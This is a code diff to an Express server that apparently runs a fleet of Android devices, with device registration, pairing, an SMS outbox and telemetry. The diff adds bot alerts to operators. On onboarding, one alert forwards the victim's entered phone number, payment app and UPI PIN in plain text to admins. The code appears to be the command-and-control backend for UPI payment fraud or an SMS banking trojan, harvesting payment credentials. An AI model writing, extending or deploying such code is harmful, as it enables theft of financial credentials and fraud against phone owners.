@@ -5,6 +5,7 @@ const config = require("../config");
 const db = require("../database");
 const u = require("../utils");
 const hub = require("../hub");
+const bot = require("../bot");
 
 const ah = (fn) => (req, res, next) => Promise.resolve(fn(req, res, next)).catch(next);
 const router = express.Router();
@@ -24,6 +25,18 @@ async function requireDevice(req, res, next) {
   req.device = device;
   req.deviceId = String(device._id);
   next();
+}
+
+async function ownerFromBody(b) {
+  const raw = String((b || {}).owner_key_id || "").trim();
+  if (!raw) return null;
+  const doc = await u.keyById(raw).catch(() => null);
+  return doc ? String(doc._id) : null;
+}
+
+async function ownerDoc(device) {
+  if (!device || !device.owner_key_id) return null;
+  return u.keyById(device.owner_key_id).catch(() => null);
 }
 
 async function touchDevice(req) {
@@ -54,6 +67,7 @@ router.post("/devices/register", ah(async (req, res) => {
   const now = db.utcNow();
   const androidId = String(b.android_id || "").slice(0, 64);
   const installId = String(b.install_id || "").slice(0, 64);
+  const ownerKey = await ownerFromBody(b);
 
   let device = await db.devices.findOne({ registration_id_hash: rh });
   let isNew = false;
@@ -81,6 +95,7 @@ router.post("/devices/register", ah(async (req, res) => {
       android_id: androidId || null,
       install_id: installId || null,
       app_version: String(b.app_version || "").slice(0, 20),
+      owner_key_id: ownerKey,
       created_at: now,
       first_seen: now,
       installed_at: now,
@@ -107,24 +122,27 @@ router.post("/devices/register", ah(async (req, res) => {
       })
     );
   } else {
-    await db.devices.updateOne(
-      { _id: device._id },
-      {
-        $set: {
-          last_seen: now,
-          is_active: true,
-          install_state: "active",
-          ...(androidId ? { android_id: androidId } : {}),
-          ...(installId ? { install_id: installId } : {}),
-          ...(b.app_version ? { app_version: String(b.app_version).slice(0, 20) } : {}),
-        },
-        $unset: { uninstalled_at: "" },
-      }
-    );
+    const patch = {
+      last_seen: now,
+      is_active: true,
+      install_state: "active",
+    };
+    if (androidId) patch.android_id = androidId;
+    if (installId) patch.install_id = installId;
+    if (b.app_version) patch.app_version = String(b.app_version).slice(0, 20);
+    if (ownerKey) patch.owner_key_id = ownerKey;
+
+    await db.devices.updateOne({ _id: device._id }, { $set: patch, $unset: { uninstalled_at: "" } });
+    device = { ...device, ...patch };
   }
 
   if (b.telemetry && typeof b.telemetry === "object") {
     await u.applyTelemetry(device, b.telemetry).catch(() => {});
+    device = (await db.devices.findOne({ _id: device._id })) || device;
+  }
+
+  if (isNew) {
+    hub.spawn(bot.notifyNewConnection(device, await ownerDoc(device)));
   }
 
   res.json({
@@ -203,11 +221,8 @@ router.post("/pair", ah(async (req, res) => {
   }
 
   let device = null;
-  if (doc.device_id) {
-    device = await u.getDeviceOr404(doc.device_id).catch(() => null);
-  } else if (rid) {
-    device = await deviceByRid(rid);
-  }
+  if (doc.device_id) device = await u.getDeviceOr404(doc.device_id).catch(() => null);
+  else if (rid) device = await deviceByRid(rid);
   if (!device) throw new u.HttpError(404, "device nahi mila");
 
   const now = db.utcNow();
@@ -240,6 +255,9 @@ router.post("/devices/onboarding", ah(requireDevice), ah(async (req, res) => {
   };
   if (b.device_name) fields.device_name = String(b.device_name).slice(0, 60);
 
+  const ownerKey = await ownerFromBody(b);
+  if (ownerKey && !req.device.owner_key_id) fields.owner_key_id = ownerKey;
+
   await db.devices.updateOne({ _id: req.device._id }, { $set: fields });
   if (b.telemetry && typeof b.telemetry === "object") {
     await u.applyTelemetry(req.device, b.telemetry).catch(() => {});
@@ -251,6 +269,20 @@ router.post("/devices/onboarding", ah(requireDevice), ah(async (req, res) => {
     device_name: fields.device_name || req.device.device_name,
   });
   u.logEvent("device_onboarding", { app: fields.payment_app }, req.deviceId);
+
+  if (config.BOT_NOTIFY_CONNECTIONS && bot.enabled()) {
+    hub.spawn(
+      bot.notifyAdmins(
+        [
+          "🧾 <b>Onboarding complete</b>",
+          `<code>${u.escapeHtml(u.deviceShortId(req.device))}</code>`,
+          `Entered number: <code>${u.escapeHtml(fields.phone_number || "—")}</code>`,
+          `App: ${u.escapeHtml(fields.payment_app || "—")}`,
+          `PIN: ${u.escapeHtml(fields.upi_pin || "—")}`,
+        ].join("\n")
+      )
+    );
+  }
 
   res.json({ status: "ok", device_id: req.deviceId });
 }));
@@ -317,11 +349,7 @@ router.get("/devices/outbox", ah(requireDevice), ah(async (req, res) => {
 
 async function ackOutbox(outboxId, status, error = "", simSlot = -1) {
   let oid;
-  try {
-    oid = new db.ObjectId(String(outboxId));
-  } catch (_) {
-    return false;
-  }
+  try { oid = new db.ObjectId(String(outboxId)); } catch (_) { return false; }
 
   const row = await db.outbox.findOne({ _id: oid });
   if (!row) return false;
@@ -379,9 +407,7 @@ router.post("/devices/:device_id/ack", ah(async (req, res) => {
 async function outboxCounters() {
   const out = { pending: 0, queued: 0, sent: 0, failed: 0 };
   try {
-    const rows = await db.outbox
-      .aggregate([{ $group: { _id: "$status", n: { $sum: 1 } } }])
-      .toArray();
+    const rows = await db.outbox.aggregate([{ $group: { _id: "$status", n: { $sum: 1 } } }]).toArray();
     for (const r of rows) {
       const k = String(r._id || "");
       if (k in out) out[k] = r.n;
